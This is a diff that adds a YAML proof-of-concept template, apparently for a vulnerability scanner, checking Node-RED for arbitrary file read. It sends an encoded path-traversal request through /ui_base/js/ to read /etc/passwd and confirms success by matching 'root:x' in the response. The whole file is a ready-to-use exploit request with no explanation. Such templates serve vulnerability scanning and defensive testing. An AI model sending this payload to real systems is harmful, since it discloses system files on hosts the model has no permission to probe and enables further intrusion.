@@ -1,0 +1,9 @@
+name: poc-yaml-Node-RED-Diretory
+description: "任意文件读取"
+method: GET
+path:
+  - /ui_base/js/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
+expression:
+  status: 200
+  body_all:
+    - "root:x"
